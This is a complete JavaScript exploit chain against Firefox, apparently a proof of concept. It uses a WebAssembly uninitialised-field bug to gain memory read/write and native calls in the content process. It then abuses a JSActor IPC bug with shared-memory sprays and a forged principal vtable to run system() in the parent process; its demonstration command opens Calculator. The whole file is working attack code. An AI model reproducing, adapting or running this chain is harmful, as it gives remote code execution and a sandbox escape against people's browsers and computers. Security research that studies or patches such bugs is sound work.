const output = document.querySelector("#log");

const OFFSETS = {
  // Bug 2024918.
  inlineData: 56n,
  fakeObject: 16,
  nativeObjectElements: 16n,
  wasmInstance: 24n,
  importInstance: 8n,
  importRealm: 16n,
  importCallable: 24n,
  importFlags: 32n,
  typedArrayClass: 0x9aac788n,

  // Bug 2022034.
  nsPIDOMWindowInner: 0x28n,
  pWindowGlobalChild: 0x40n,
  systemPrincipalVptr: 0x96bc880n,
  principal: 0x27f8,
  vtable: 0x3000,
  vtableCall: 0x3270,
  command: 0x3f00,
  entryInnerWindow: 0x17418ecn,
  getWindowContext: 0x1775b8cn,
  getWindowGlobalChild: 0x444b33cn,
  sendRawMessage: 0x3a6c7d4n,
  allocUnsafeShmem: 0xc18474n,
  dlsym: 0x709ba78n,
  systemGadget: 0x1192ff8n,
};

const PARENT_OBJECT = 0x310000000n;
const OBJECT_TAG = 0xfffe000000000000n;
const POINTER_MASK = 0x00007fffffffffffn;
const PAGE_SIZE = 0x4000;
const SHMEM_SIZE = 0x400000;
const SHMEM_COUNT = 128;

const encoder = new TextEncoder();
const BYTES = {
  actor: encoder.encode("AudioPlayback\0"),
  fakeName: encoder.encode("Bug2022034Fake\0"),
  strcpy: encoder.encode("strcpy\0"),
  system: encoder.encode("system\0"),
  command: encoder.encode("/usr/bin/open -a Calculator\0"),
};

// Allocate these before rce(). Its sprays trigger nursery GCs, which promote
// the buffers before their native addresses are saved. Buffers allocated later
// could move during a native call and leave stale pointers.
const scratch = {
  string: new Uint8Array(96),
  data: new Uint8Array(0x28),
  stringData: 0n,
  dataAddress: 0n,
};

function log(message) {
  output.textContent += message + "\n";
  console.log(message);
}

function hex(value) {
  return "0x" + BigInt.asUintN(64, value).toString(16);
}

function store32(buffer, offset, value) {
  for (let i = 0; i < 4; i++) {
    buffer[offset + i] = (Number(value) >>> (i * 8)) & 0xff;
  }
}

function store64(buffer, offset, value) {
  value = BigInt.asUintN(64, value);
  for (let i = 0; i < 8; i++) {
    buffer[offset + i] = Number(value >> BigInt(i * 8) & 0xffn);
  }
}

function load64(buffer, offset = 0) {
  let value = 0n;
  for (let i = 0; i < 8; i++) {
    value |= BigInt(buffer[offset + i]) << BigInt(i * 8);
  }
  return value;
}

// Stage 1: use Bug 2024918 to get code execution in the renderer process.
async function rce() {
  async function loadWasm(name, imports = {}) {
    const response = await fetch(name + ".wasm", {cache: "no-store"});
    return WebAssembly.instantiate(await response.arrayBuffer(), imports);
  }

  const placeholder = () => 0x1122334455667788n;
  const [triggerI64, triggerAnyref, sprayRef, sprayI64, fcallWasm] =
      await Promise.all([
        loadWasm("trigger-i64"),
        loadWasm("trigger-anyref"),
        loadWasm("spray-ref"),
        loadWasm("spray-i64"),
        loadWasm("fcall", {env: {target: placeholder}}),
      ]);

  // Run both triggers enough times for SpiderMonkey to optimize the vulnerable
  // struct allocation.
  for (let i = 0; i < 20000; i++) {
    triggerI64.instance.exports.run(3);
    triggerAnyref.instance.exports.run(3);
  }
  await new Promise(resolve => setTimeout(resolve, 1000));
  for (let i = 0; i < 1000; i++) {
    triggerI64.instance.exports.run(3);
    triggerAnyref.instance.exports.run(3);
  }

  // Bug 2024918 removes the initialization of $Inner.field0. Fill reusable
  // Wasm allocations with an object pointer or address, then allocate $Inner
  // and read its leftover field bytes as an i64 or reference.
  function addrof(object) {
    for (let i = 0; i < 8; i++) {
      sprayRef.instance.exports.spray(0x40000, object);
    }
    triggerI64.instance.exports.run(3);
    return BigInt.asUintN(64, triggerI64.instance.exports.read());
  }

  function fakeobj(address) {
    for (let i = 0; i < 8; i++) {
      sprayI64.instance.exports.spray(0x40000, address);
    }
    triggerAnyref.instance.exports.run(3);
    return triggerAnyref.instance.exports.read();
  }

  const stringScratch = new Uint8Array(96);
  const objectScratch = new Uint8Array(96);
  const shapeArray = new Uint8Array(16);
  const objectSlot = [{}];

  const stringScratchAddress = addrof(stringScratch);
  const objectScratchAddress = addrof(objectScratch);
  const shapeArrayAddress = addrof(shapeArray);
  const objectSlotObjectAddress = addrof(objectSlot);

  const stringDataAddress = stringScratchAddress + OFFSETS.inlineData;
  const fakeStringAddress = stringDataAddress + BigInt(OFFSETS.fakeObject);
  const fakeArrayAddress = objectScratchAddress + OFFSETS.inlineData +
      BigInt(OFFSETS.fakeObject);

  // Read a valid Shape pointer through a fake string.
  store32(stringScratch, OFFSETS.fakeObject, 0x410);
  store32(stringScratch, OFFSETS.fakeObject + 4, 8);
  store64(stringScratch, OFFSETS.fakeObject + 8, shapeArrayAddress);
  store64(stringScratch, OFFSETS.fakeObject + 16, 0n);

  const string = fakeobj(fakeStringAddress | 2n);
  let shape = 0n;
  for (let i = 0; i < 8; i++) {
    shape |= BigInt(string.charCodeAt(i)) << BigInt(i * 8);
  }

  // Use that Shape to create a fake Uint8Array over arbitrary memory.
  //
  // fakeArrayAddress
  //   +0x00  Shape*
  //   +0x08  slots*           = nullptr
  //   +0x10  elements*        = fakeArrayAddress
  //   +0x18  BUFFER_SLOT      = false
  //   +0x20  LENGTH_SLOT      = 8
  //   +0x28  BYTEOFFSET_SLOT  = 0
  //   +0x30  DATA_SLOT        = shapeArrayAddress
  store64(objectScratch, OFFSETS.fakeObject, shape);
  store64(objectScratch, OFFSETS.fakeObject + 8, 0n);
  store64(objectScratch, OFFSETS.fakeObject + 16, fakeArrayAddress);
  store64(objectScratch, OFFSETS.fakeObject + 24, 0xfff9000000000000n);
  store64(objectScratch, OFFSETS.fakeObject + 32, 8n);
  store64(objectScratch, OFFSETS.fakeObject + 40, 0n);
  store64(objectScratch, OFFSETS.fakeObject + 48, shapeArrayAddress);

  const memory = fakeobj(fakeArrayAddress);

  // Each call retargets the same fake typed array.
  function mem(address, length = 8n) {
    store64(objectScratch, OFFSETS.fakeObject + 32, length);
    store64(objectScratch, OFFSETS.fakeObject + 48, address);
    return memory;
  }

  function read64(address) {
    return load64(mem(address));
  }

  function write64(address, value) {
    store64(mem(address), 0, value);
  }

  const objectSlotAddress = read64(
      objectSlotObjectAddress + OFFSETS.nativeObjectElements);

  // We only need the sprays once. read64() and write64() now let objectSlot[0]
  // provide addrof() and fakeobj() directly.
  const prims = {
    addrof(object) {
      objectSlot[0] = object;
      return read64(objectSlotAddress) & POINTER_MASK;
    },

    fakeobj(address) {
      write64(objectSlotAddress, OBJECT_TAG | (address & POINTER_MASK));
      return objectSlot[0];
    },

    read64,
    write64,
  };

  const target = {};
  if (prims.fakeobj(prims.addrof(target)) !== target) {
    throw new Error("addrof/fakeobj failed");
  }

  // fcall.wasm forwards eight i64 arguments to one imported function. Find its
  // native target pointer and replace it with an address of our choice. Calling
  // the Wasm wrapper then loads x0 through x7 and branches to that target.
  const instanceObject = prims.addrof(fcallWasm.instance);
  const placeholderAddress = prims.addrof(placeholder);
  const instance = prims.read64(instanceObject + OFFSETS.wasmInstance);
  let importData = 0n;

  for (let offset = 0n; offset < 0x2000n; offset += 8n) {
    const address = instance + offset;
    if (prims.read64(address + OFFSETS.importInstance) === instance &&
        prims.read64(address + OFFSETS.importRealm) !== 0n &&
        prims.read64(address + OFFSETS.importCallable) ===
            placeholderAddress &&
        (prims.read64(address + OFFSETS.importFlags) & 0xffn) === 0n) {
      importData = address;
      break;
    }
  }

  if (importData === 0n) {
    throw new Error("Wasm import data not found");
  }

  function fcall(
      target,
      x0 = 0n,
      x1 = 0n,
      x2 = 0n,
      x3 = 0n,
      x4 = 0n,
      x5 = 0n,
      x6 = 0n,
      x7 = 0n) {
    prims.write64(importData, target);
    return BigInt.asUintN(64, fcallWasm.instance.exports.call(
        x0, x1, x2, x3, x4, x5, x6, x7));
  }

  const stringAddress = prims.addrof(scratch.string);
  scratch.stringData = stringAddress + OFFSETS.inlineData;
  scratch.dataAddress = prims.addrof(scratch.data) + OFFSETS.inlineData;

  const baseShape = prims.read64(prims.read64(stringAddress));
  const contentXul = prims.read64(baseShape) - OFFSETS.typedArrayClass;
  if ((prims.read64(contentXul) & 0xffffffffn) !== 0xfeedfacfn) {
    throw new Error("XUL base not found");
  }

  log("[+] content XUL: " + hex(contentXul));
  return {mem, fcall, contentXul, scratch};
}

// Stage 2: escape the content-process sandbox with Bug 2022034.
async function sbx(stage1) {
  const {mem, fcall, contentXul, scratch} = stage1;

  // Recover the JS actor for this page from its current inner window.
  function getActor() {
    const innerWindow = fcall(contentXul + OFFSETS.entryInnerWindow);
    const windowContext = fcall(
        contentXul + OFFSETS.getWindowContext,
        innerWindow + OFFSETS.nsPIDOMWindowInner);
    const actor = fcall(
        contentXul + OFFSETS.getWindowGlobalChild, windowContext);
    if (actor === 0n) {
      throw new Error("WindowGlobalChild not found");
    }
    return actor;
  }

  // Build JSActorMessageMeta and JSIPCValue, then call SendRawMessage().
  function trigger(actor, objectAddress) {
    const metadata = scratch.string;
    const data = scratch.data;
    const message = "trigger";

    metadata.fill(0);
    data.fill(0);
    metadata.set(BYTES.actor, 0x30);
    for (let i = 0; i < message.length; i++) {
      const character = message.charCodeAt(i);
      metadata[0x40 + i * 2] = character & 0xff;
      metadata[0x41 + i * 2] = character >>> 8;
    }

    store64(metadata, 0x00, scratch.stringData + 0x30n);
    store32(metadata, 0x08, BYTES.actor.length - 1);
    store32(metadata, 0x0c, 0x00020001);
    store64(metadata, 0x10, scratch.stringData + 0x40n);
    store32(metadata, 0x18, message.length);
    store32(metadata, 0x1c, 0x00020001);
    store32(metadata, 0x20, 0);
    store64(metadata, 0x28, 0n);

    store64(data, 0x00, OBJECT_TAG | (objectAddress & POINTER_MASK));
    store32(data, 0x20, 5);

    const ret = fcall(
        contentXul + OFFSETS.sendRawMessage,
        actor + OFFSETS.pWindowGlobalChild,
        scratch.stringData,
        scratch.dataAddress,
        0n);
    if (ret === 0n) {
      throw new Error("SendRawMessage failed");
    }
  }

  // Lay out the parent-side fake JSObject and principal in one shared page.
  function fakePage(parentAddress, callTarget) {
    const page = new Uint8Array(PAGE_SIZE);

    // JSObject -> Shape -> BaseShape -> Realm -> Compartment.
    store64(page, 0x000, parentAddress + 0x100n);
    store64(page, 0x008, parentAddress + 0x380n);
    store64(page, 0x100, parentAddress + 0x200n);
    store32(page, 0x108, 0x10);
    store64(page, 0x200, parentAddress + 0x300n);
    store64(page, 0x208, parentAddress + 0x400n);
    store64(page, 0x300, parentAddress + 0x380n);
    page.set(BYTES.fakeName, 0x380);
    store64(page, 0x400, parentAddress + 0x1000n);
    store64(page, 0x528, parentAddress + 0x2800n);
    store64(page, 0x1000, parentAddress + 0x1800n);
    store64(page, 0x1008, parentAddress + 0x100n);
    store64(page, 0x1048, parentAddress + 0x1060n);
    store64(page, 0x1050, 1n);
    store64(page, 0x1058, 1n);
    store64(page, 0x1060, parentAddress + 0x400n);
    store64(page, 0x1070, parentAddress + 0x3800n);

    // Realm -> BasePrincipal -> vtable call.
    store64(page, OFFSETS.principal, parentAddress + BigInt(OFFSETS.vtable));
    page.fill(0x41, OFFSETS.vtable, OFFSETS.vtable + 0x800);
    store64(page, OFFSETS.vtableCall, callTarget);
    return page;
  }

  // Repeat the fake page across shared mappings that may cover PARENT_OBJECT.
  function sprayShmem(actor, callTarget) {
    const page = fakePage(PARENT_OBJECT, callTarget);
    const block = new Uint8Array(SHMEM_SIZE);
    for (let offset = 0; offset < SHMEM_SIZE; offset += PAGE_SIZE) {
      block.set(page, offset);
    }

    const mappings = [];
    for (let i = 0; i < SHMEM_COUNT; i++) {
      scratch.string.fill(0);
      const ok = fcall(
          contentXul + OFFSETS.allocUnsafeShmem,
          actor + OFFSETS.pWindowGlobalChild,
          BigInt(SHMEM_SIZE),
          scratch.stringData);
      const mapping = load64(scratch.string, 8);
      if (ok === 0n || mapping === 0n) {
        throw new Error("AllocUnsafeShmem failed");
      }
      mappings.push(mapping);
      mem(mapping, BigInt(SHMEM_SIZE)).set(block);
    }
    return mappings;
  }

  // Find the real principal pointer copied into shared memory by strcpy().
  async function leakParentXul(mappings) {
    const initialVptr = PARENT_OBJECT + BigInt(OFFSETS.vtable);
    const deadline = performance.now() + 5000;

    while (performance.now() < deadline) {
      let candidate = null;
      for (const mapping of mappings) {
        const memory = mem(mapping, BigInt(SHMEM_SIZE));
        for (let offset = 0; offset < SHMEM_SIZE; offset += PAGE_SIZE) {
          const value = load64(memory, offset + OFFSETS.principal);
          if (value !== initialVptr && value > OFFSETS.systemPrincipalVptr) {
            candidate = {mapping, offset, value};
            break;
          }
        }
        if (candidate !== null) {
          break;
        }
      }

      if (candidate !== null) {
        await new Promise(resolve => setTimeout(resolve, 1));
        const memory = mem(candidate.mapping, BigInt(SHMEM_SIZE));
        const value = load64(memory, candidate.offset + OFFSETS.principal);
        const parentXul = value - OFFSETS.systemPrincipalVptr;
        if (value === candidate.value &&
            (parentXul & BigInt(PAGE_SIZE - 1)) === 0n) {
          return {
            mapping: candidate.mapping,
            offset: candidate.offset,
            parentXul,
          };
        }
      }

      await new Promise(resolve => setTimeout(resolve, 10));
    }

    throw new Error("parent XUL leak failed");
  }

  // Use the leaked XUL base to call system() from a second fake object.
  function exec(actor, leak, system) {
    const useNextPage = leak.offset + 2 * PAGE_SIZE <= SHMEM_SIZE;
    const controlOffset = leak.offset +
        (useNextPage ? PAGE_SIZE : -PAGE_SIZE);
    const controlObject = PARENT_OBJECT +
        BigInt(useNextPage ? PAGE_SIZE : -PAGE_SIZE);
    const control = fakePage(
        controlObject, leak.parentXul + OFFSETS.systemGadget);

    control.set(BYTES.command, OFFSETS.command);
    store64(
        control, OFFSETS.principal + 0x10,
        controlObject + BigInt(OFFSETS.command));
    store64(control, OFFSETS.principal + 0x18, system);
    store64(control, OFFSETS.principal + 0x20, 0n);

    mem(
        leak.mapping + BigInt(controlOffset), BigInt(PAGE_SIZE)).set(control);
    trigger(actor, controlObject);
  }

  function _dlsym(bytes) {
    scratch.string.set(bytes);
    const address = fcall(
        contentXul + OFFSETS.dlsym,
        0xfffffffffffffffen,
        scratch.stringData);
    if (address === 0n) {
      throw new Error("dlsym failed");
    }
    return address;
  }

  const actor = getActor();
  const strcpy = _dlsym(BYTES.strcpy);
  const system = _dlsym(BYTES.system);
  log("[+] WindowGlobalChild: " + hex(actor));

  const mappings = sprayShmem(actor, strcpy);
  trigger(actor, PARENT_OBJECT);

  const leak = await leakParentXul(mappings);
  log("[+] parent XUL: " + hex(leak.parentXul));
  exec(actor, leak, system);
}

// Chains Bug 2024918 and Bug 2022034 for a full sandbox escape.
async function pwn() {
  const stage1 = await rce();
  await sbx(stage1);
}

pwn().catch(error => log("[!] " + (error.stack || error)));
